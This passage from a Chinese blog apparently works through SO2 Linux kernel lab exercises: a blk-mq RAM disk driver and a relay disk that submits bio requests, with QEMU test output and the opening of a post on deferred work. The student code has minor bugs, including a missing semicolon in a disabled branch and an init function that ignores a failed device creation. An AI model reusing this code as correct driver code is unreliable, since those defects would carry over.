class="params">(struct block_device *bdev, <span class="keyword">fmode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_release</span><span class="params">(struct gendisk *gd, <span class="keyword">fmode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">block_device_operations</span> <span class="title">my_block_ops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.open = my_block_open,</span><br><span class="line">	.release = my_block_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_block_transfer</span><span class="params">(struct my_block_dev *dev, <span class="keyword">sector_t</span> sector,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">char</span> *buffer, <span class="keyword">int</span> dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> offset = sector * KERNEL_SECTOR_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* check for read/write beyond end of block device */</span></span><br><span class="line">	<span class="keyword">if</span> ((offset + len) &gt; dev-&gt;size)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 3: read/write to dev buffer depending on dir */</span></span><br><span class="line">	<span class="keyword">if</span>(dir == <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(dev-&gt;data + offset,buffer,len);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(buffer,dev-&gt;data + offset,len);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* to transfer data using bio structures enable USE_BIO_TRANFER */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_BIO_TRANSFER == 1</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_xfer_request</span><span class="params">(struct my_block_dev *dev, struct request *req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 6: iterate segments */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> <span class="title">bvec</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">req_iterator</span> <span class="title">iter</span>;</span></span><br><span class="line">		<span class="comment">/* TODO 6: copy bio data to device buffer */</span></span><br><span class="line">	rq_for_each_segment(bvec,req,iter)&#123;</span><br><span class="line">		<span class="keyword">sector_t</span> sector = iter.iter.bi_sector;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> offset = bvec.bv_offset;</span><br><span class="line">		<span class="keyword">size_t</span> len = bvec.bv_len;</span><br><span class="line">		<span class="keyword">int</span> dir = bio_data_dir(iter.bio);</span><br><span class="line">		<span class="keyword">char</span> *buffer = kmap_atomic(bvec.bv_page);</span><br><span class="line">		printk(KERN_LOG_LEVEL <span class="string">&quot;%s: buf %8p offset %lu len %u dir %d\n&quot;</span>, __func__, buffer, offset, len, dir);</span><br><span class="line"></span><br><span class="line">		my_block_transfer(dev, sector, len, buffer + offset, dir);</span><br><span class="line">		kunmap_atomic(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">blk_status_t</span> <span class="title">my_block_request</span><span class="params">(struct blk_mq_hw_ctx *hctx,</span></span></span><br><span class="line"><span class="params"><span class="function">				     <span class="keyword">const</span> struct blk_mq_queue_data *bd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">request</span> *<span class="title">rq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">my_block_dev</span> *<span class="title">dev</span> =</span> hctx-&gt;<span class="built_in">queue</span>-&gt;queuedata;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: get pointer to request */</span></span><br><span class="line">	rq = bd-&gt;rq;</span><br><span class="line">	<span class="comment">/* TODO 2: start request processing. */</span></span><br><span class="line">	blk_mq_start_request(rq);</span><br><span class="line">	<span class="comment">/* TODO 2: check fs request. Return if passthrough. */</span></span><br><span class="line">	<span class="keyword">if</span>(blk_rq_is_passthrough(rq))&#123;</span><br><span class="line">		printk (KERN_NOTICE <span class="string">&quot;Skip non-fs request\n&quot;</span>);</span><br><span class="line">        blk_mq_end_request(rq, BLK_STS_IOERR);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 2: print request information */</span></span><br><span class="line">	printk(KERN_LOG_LEVEL</span><br><span class="line">		<span class="string">&quot;request received: pos=%llu bytes=%u &quot;</span></span><br><span class="line">		<span class="string">&quot;cur_bytes=%u dir=%c\n&quot;</span>,</span><br><span class="line">		(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) blk_rq_pos(rq),</span><br><span class="line">		blk_rq_bytes(rq), blk_rq_cur_bytes(rq),</span><br><span class="line">		rq_data_dir(rq) ? <span class="string">&#x27;W&#x27;</span> : <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_BIO_TRANSFER == 1</span></span><br><span class="line">	<span class="comment">/* TODO 6: process the request by calling my_xfer_request */</span></span><br><span class="line">	my_xfer_request(dev,rq)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="comment">/* TODO 3: process the request by calling my_block_transfer */</span></span><br><span class="line">	my_block_transfer(dev,blk_rq_pos(rq),blk_rq_bytes(rq),bio_data(rq-&gt;bio),rq_data_dir(rq));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: end request successfully */</span></span><br><span class="line">	blk_mq_end_request(rq, BLK_STS_OK);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> BLK_STS_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">blk_mq_ops</span> <span class="title">my_queue_ops</span> =</span> &#123;</span><br><span class="line">	.queue_rq = my_block_request,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">create_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	dev-&gt;size = NR_SECTORS * KERNEL_SECTOR_SIZE;</span><br><span class="line">	dev-&gt;data = vmalloc(dev-&gt;size);</span><br><span class="line">	<span class="keyword">if</span> (dev-&gt;data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_ERR <span class="string">&quot;vmalloc: out of memory\n&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_vmalloc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize tag set. */</span></span><br><span class="line">	dev-&gt;tag_set.ops = &amp;my_queue_ops;</span><br><span class="line">	dev-&gt;tag_set.nr_hw_queues = <span class="number">1</span>;</span><br><span class="line">	dev-&gt;tag_set.queue_depth = <span class="number">128</span>;</span><br><span class="line">	dev-&gt;tag_set.numa_node = NUMA_NO_NODE;</span><br><span class="line">	dev-&gt;tag_set.cmd_size = <span class="number">0</span>;</span><br><span class="line">	dev-&gt;tag_set.flags = BLK_MQ_F_SHOULD_MERGE;</span><br><span class="line">	err = blk_mq_alloc_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">	    printk(KERN_ERR <span class="string">&quot;blk_mq_alloc_tag_set: can&#x27;t allocate tag set\n&quot;</span>);</span><br><span class="line">	    <span class="keyword">goto</span> out_alloc_tag_set;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate queue. */</span></span><br><span class="line">	dev-&gt;<span class="built_in">queue</span> = blk_mq_init_queue(&amp;dev-&gt;tag_set);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(dev-&gt;<span class="built_in">queue</span>)) &#123;</span><br><span class="line">		printk(KERN_ERR <span class="string">&quot;blk_mq_init_queue: out of memory\n&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_blk_init;</span><br><span class="line">	&#125;</span><br><span class="line">	blk_queue_logical_block_size(dev-&gt;<span class="built_in">queue</span>, KERNEL_SECTOR_SIZE);</span><br><span class="line">	dev-&gt;<span class="built_in">queue</span>-&gt;queuedata = dev;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize the gendisk structure */</span></span><br><span class="line">	dev-&gt;gd = alloc_disk(MY_BLOCK_MINORS);</span><br><span class="line">	<span class="keyword">if</span> (!dev-&gt;gd) &#123;</span><br><span class="line">		printk(KERN_ERR <span class="string">&quot;alloc_disk: failure\n&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_alloc_disk;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dev-&gt;gd-&gt;major = MY_BLOCK_MAJOR;</span><br><span class="line">	dev-&gt;gd-&gt;first_minor = <span class="number">0</span>;</span><br><span class="line">	dev-&gt;gd-&gt;fops = &amp;my_block_ops;</span><br><span class="line">	dev-&gt;gd-&gt;<span class="built_in">queue</span> = dev-&gt;<span class="built_in">queue</span>;</span><br><span class="line">	dev-&gt;gd-&gt;private_data = dev;</span><br><span class="line">	<span class="built_in">snprintf</span>(dev-&gt;gd-&gt;disk_name, DISK_NAME_LEN, <span class="string">&quot;myblock&quot;</span>);</span><br><span class="line">	set_capacity(dev-&gt;gd, NR_SECTORS);</span><br><span class="line"></span><br><span class="line">	add_disk(dev-&gt;gd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_alloc_disk:</span><br><span class="line">	blk_cleanup_queue(dev-&gt;<span class="built_in">queue</span>);</span><br><span class="line">out_blk_init:</span><br><span class="line">	blk_mq_free_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">out_alloc_tag_set:</span><br><span class="line">	vfree(dev-&gt;data);</span><br><span class="line">out_vmalloc:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">my_block_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: register block device */</span></span><br><span class="line">	<span class="keyword">int</span> status = register_blkdev(MY_BLOCK_MAJOR,MY_BLKDEV_NAME);</span><br><span class="line">	<span class="keyword">if</span>(status &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;unable to register mybdev block device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 2: create block device using create_block_device */</span></span><br><span class="line">	err = create_block_device(&amp;g_dev);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/* TODO 2: unregister block device in case of an error */</span></span><br><span class="line">	unregister_blkdev(MY_BLOCK_MAJOR, MY_BLKDEV_NAME);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_block_device</span><span class="params">(struct my_block_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dev-&gt;gd) &#123;</span><br><span class="line">		del_gendisk(dev-&gt;gd);</span><br><span class="line">		put_disk(dev-&gt;gd);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dev-&gt;<span class="built_in">queue</span>)</span><br><span class="line">		blk_cleanup_queue(dev-&gt;<span class="built_in">queue</span>);</span><br><span class="line">	<span class="keyword">if</span> (dev-&gt;tag_set.tags)</span><br><span class="line">		blk_mq_free_tag_set(&amp;dev-&gt;tag_set);</span><br><span class="line">	<span class="keyword">if</span> (dev-&gt;data)</span><br><span class="line">		vfree(dev-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">my_block_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 2: cleanup block device using delete_block_device */</span></span><br><span class="line">	delete_block_device(&amp;g_dev);</span><br><span class="line">	<span class="comment">/* TODO 1: unregister block device */</span></span><br><span class="line">	unregister_blkdev(MY_BLOCK_MAJOR, MY_BLKDEV_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_block_init);</span><br><span class="line">module_exit(my_block_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>在提交块 IO 请求时，需要附带3个关键结构体：<ul>
<li><code>blk_mq_tag_set</code> 类型的“标记”</li>
<li><code>request_queue</code> 类型的请求队列</li>
<li><code>gendisk</code> 类型的磁盘相关信息</li>
</ul>
</li>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/block_device_drivers/<span class="number">1</span><span class="number">-2</span><span class="number">-3</span><span class="number">-6</span>-ram-disk/user# ./ram-disk-test</span><br><span class="line">                                                                                </span><br><span class="line">insmod ../kernel/ram-disk.ko                                                    </span><br><span class="line">mknod /dev/myblock b <span class="number">240</span> <span class="number">0</span>                                                      </span><br><span class="line">mknod: /dev/myblock: File exists                                                </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=R                         </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">0</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">1</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">2</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">3</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">4</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">5</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W                         </span><br><span class="line">test sector   <span class="number">6</span> ... passed                                                      </span><br><span class="line">request received: pos=<span class="number">0</span> bytes=<span class="number">4096</span> cur_bytes=<span class="number">4096</span> dir=W    </span><br></pre></td></tr></table></figure>
<p>Test2 完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 Lab - Block device drivers (#7)</span></span><br><span class="line"><span class="comment"> * Linux - Exercise #4, #5 (Relay disk - bio)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genhd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/blkdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Relay disk&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYSICAL_DISK_NAME	<span class="meta-string">&quot;/dev/vdb&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_SECTOR_SIZE	512</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIO_WRITE_MESSAGE	<span class="meta-string">&quot;def&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pointer to physical device structure */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">phys_bdev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">send_test_bio</span><span class="params">(struct block_device *bdev, <span class="keyword">int</span> dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio</span> *<span class="title">bio</span> =</span> bio_alloc(GFP_NOIO, <span class="number">1</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: fill bio (bdev, sector, direction) */</span></span><br><span class="line">	bio-&gt;bi_disk = bdev-&gt;bd_disk;</span><br><span class="line">	bio-&gt;bi_iter.bi_sector = <span class="number">0</span>;</span><br><span class="line">	bio-&gt;bi_opf = dir;</span><br><span class="line">	page = alloc_page(GFP_NOIO);</span><br><span class="line">	bio_add_page(bio, page, KERNEL_SECTOR_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 5: write message to bio buffer if direction is write */</span></span><br><span class="line">	<span class="keyword">if</span> (dir == REQ_OP_WRITE) &#123;</span><br><span class="line">		buf = kmap_atomic(page);</span><br><span class="line">		<span class="built_in">memcpy</span>(buf, BIO_WRITE_MESSAGE, <span class="built_in">strlen</span>(BIO_WRITE_MESSAGE));</span><br><span class="line">		kunmap_atomic(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 4: submit bio and wait for completion */</span></span><br><span class="line">	printk(KERN_LOG_LEVEL <span class="string">&quot;[send_test_bio] Submiting bio\n&quot;</span>);</span><br><span class="line">	submit_bio_wait(bio);</span><br><span class="line">	printk(KERN_LOG_LEVEL <span class="string">&quot;[send_test_bio] Done bio\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* TODO 4: read data (first 3 bytes) from bio buffer and print it */</span></span><br><span class="line">	buf = kmap_atomic(page);</span><br><span class="line">	printk(KERN_LOG_LEVEL <span class="string">&quot;read %02x %02x %02x\n&quot;</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>], buf[<span class="number">2</span>]);</span><br><span class="line">	kunmap_atomic(buf);</span><br><span class="line"></span><br><span class="line">	bio_put(bio);</span><br><span class="line">	__free_page(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct block_device *<span class="title">open_disk</span><span class="params">(<span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">bdev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: get block device in exclusive mode */</span></span><br><span class="line">	bdev = blkdev_get_by_path(name,FMODE_READ | FMODE_WRITE | FMODE_EXCL,THIS_MODULE);</span><br><span class="line">	<span class="keyword">return</span> bdev;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">relay_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	phys_bdev = open_disk(PHYSICAL_DISK_NAME);</span><br><span class="line">	<span class="keyword">if</span> (phys_bdev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_ERR <span class="string">&quot;[relay_init] No such device\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	send_test_bio(phys_bdev, REQ_OP_READ);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_disk</span><span class="params">(struct block_device *bdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 4: put block device */</span></span><br><span class="line">	blkdev_put(bdev, FMODE_READ | FMODE_WRITE | FMODE_EXCL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">relay_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 5: send test write bio */</span></span><br><span class="line">	send_test_bio(phys_bdev, REQ_OP_WRITE);</span><br><span class="line">	close_disk(phys_bdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(relay_init);</span><br><span class="line">module_exit(relay_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：对结构体 <code>bio</code> 的操作必须包裹在 <code>kmap_atomic</code> 和 <code>kunmap_atomic</code> 之间</li>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/block_device_drivers/<span class="number">4</span><span class="number">-5</span>-relay-disk<span class="meta"># insmod relay-disk.ko </span></span><br><span class="line">[send_test_bio] Submiting bio</span><br><span class="line">[send_test_bio] Done bio</span><br><span class="line">read <span class="number">64</span> <span class="number">65</span> <span class="number">66</span></span><br><span class="line">root@qemux86:~/skels/block_device_drivers/<span class="number">4</span><span class="number">-5</span>-relay-disk<span class="meta"># rmmod relay-disk.ko </span></span><br><span class="line">[send_test_bio] Submiting bio                                                   </span><br><span class="line">[send_test_bio] Done bio                                                        </span><br><span class="line">read <span class="number">64</span> <span class="number">65</span> <span class="number">66</span>     </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/16/Linux-Lab5-Deferred%20work/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/16/Linux-Lab5-Deferred%20work/" class="post-title-link" itemprop="url">Linux-Lab5-Deferred work</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-16 17:46:45 / Modified: 17:47:18" itemprop="dateCreated datePublished" datetime="2022-10-16T17:46:45+08:00">2022-10-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Deferred work</strong></p>
<p>实验目标：</p>
<ul>
<li>了解延迟的工作（即计划在以后执行的代码）</li>
<li>用延迟工作的常见任务的实现</li>
<li>了解延迟工作的同步特性</li>
</ul>
<p>延迟工作是一类内核工具，它允许人们计划代码在以后的计时器上执行，此计划代码可以在进程上下文中运行，也可以在中断上下文中运行，具体取决于延迟工作的类型</p>
<p>延迟工作用于补充中断处理程序功能，因为中断具有重要的要求和限制：</p>
<ul>
<li>中断处理程序的执行时间必须尽可能短</li>
<li>在中断上下文中，我们不能使用阻塞调用</li>
</ul>
